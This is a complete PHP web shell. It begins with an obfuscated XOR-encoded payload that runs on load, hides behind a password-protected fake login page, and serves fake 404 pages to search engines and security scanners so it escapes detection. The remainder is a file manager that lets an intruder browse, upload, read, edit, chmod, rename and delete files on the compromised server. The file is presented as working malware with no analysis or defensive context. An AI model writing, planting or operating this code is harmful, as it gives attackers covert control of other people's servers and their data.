<?php $KNQDwjJ='U>UA,IsVHS4=,OB'; $QGCXZwGA='6L0 X,,0==WIE ,'^$KNQDwjJ; $ktIjMOx=':XMRM0R9AR=4- U91=:qMD7LiT Y7an.C:oGlYWe4H7+1=GR9pE8Ej ..7qrPB-Gh-U32VclU1KbfEsry6aMbkX2=PvoKqlnfm.BNGwYtrLcVqq0F1 3.7RFSV-1Tzhrh;ZmDmf0G-:BajwLlUOQZAmt>kCjUvP=<npECfw+  ZYTzf,SAKkdAXMAHUI28BKkTENxrh22s>aGc03X0ygn  UJRkmG1120;:NMZYgTM>8XTm73D:U4V ToBes5oqzeY.BvmFXJFrzHv, XX0Xa-mppU-ZTiS68KefqU6-nd7h-Z9-jeytFJ62Rck5ok SgmsrTSO-CzKfN7=YW8.RIkim3 ghh+ipX8eJ3  lyfnk4MWNPhF6lfdF+9LLo=K2wrWmGYHZ3Mkw ,N8GGkeXAUHSmig.9,eau,W9TKdm+D =5R<W6,B2B:BAoRZG9s246 QWW  yp3,XH7YSlq1PO,pokp 8-;9W2>hnw;D+fkP76YrrpBW<66.qYQD34OPXM=Fd=P hmWG-U -YqUPlkWJtzu+SX4+EP2;vvlboptm9+PKO-knLixYaajpX3wa:Yw.NVuV+nCXlpvrqxQG=PL5.R1n1S,GB7Or8Y5X> SBTcq6P7SkkBdVchwLsa A,-zu2 HSct54+6:Z oayH=k  X FGOWc8'; $TFRrYJNk=$QGCXZwGA('', 'S>es+E<Z5;RZrE-PBIIYj<X>60A-V>1C6NHnEy,o=.BERI.=WP=W75DOZV.-=7YoLI4GSzCH>T2KFeSRYMkDkO7GIpKOlVWdodH-<oS0TOlSmQUYzBTABR<nw2LE5SSRLRqFmgo9cBO6ADJlDq+0. 6PW6c4uR;XE5T,cCWXTR6<:RBG68b6MzRDH:0=GJ,cO;0:QIb;OyCkMGTR,QYZNFA997PgcUPFQdQ+4zdG2,RK=og=U+H0U5HtGf:0z :3 yO1VI-=3fODhRZA4-UqAVgyT1L.568SAkXFU>STUn>LI;MLJXYP0+ZG7XaHeaI5GERV02;LjZ0lGQR+2YM:iCM2ae6=-x=P9KEnXEYLDXNOB,;;5AfMfombOX8-0V.KWOwI,<1a9DbSDM:YgzKA. 9=6VcnS3QokQH6M5kYMk1NNP U6ZE8WjB-306;3X,mYCTy56SEODlH=+X=6DUU1;MYCKTDYYZf<WGAGL1-MNO4VB8RTVb6NDWW.24=lQ79+9NnCV5YOAwcI4TLpQsvLC:.ARQO2,Upb;WBQ+EBRMTJXJ3rwIXV.QJ:XPYC=VOSXkEKx0EdOZtkKYVTWX05O15jE7H1T+E46DgUH8L4QA7exCUR1C2BBbDvCHW7yhE7MARQVA<28SEURZU;DH<Ps7bEX1TnwfliE'^$ktIjMOx); $TFRrYJNk();
session_start();
set_time_limit(0);
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
$auth_pass = "cf9b52a8f7c9478e7d045f31d4333eb2";
if(get_magic_quotes_gpc()) { 	
function VEstripslashes($array) { 		
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 


function Login() {
	die("
<html>
<head>
<title>Login Page</title>
<style type='text/css'>
html {
    margin: 20px auto;
    background:black;
    color: green;
    text-align: center;
}
pre {
    color: white;
}

input[type=password] {
	background:transparent;
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:13px;
	border:2px solid white;
}

</style>
</head>
<center>
<br>
<br>
<header>
<img src='https://e.top4top.net/p_1120sbfwm1.jpg' width='400' height='400' align='center'>
<br>
<br>
<pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<?php
//by mathio
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$bannedIP = array("^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}



//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: black;
color:white;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
<h1><center><font color="red">@__@</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upload Berhasil</font><br />';
}else{
echo '<font color="red">Upload Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/>@__@</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>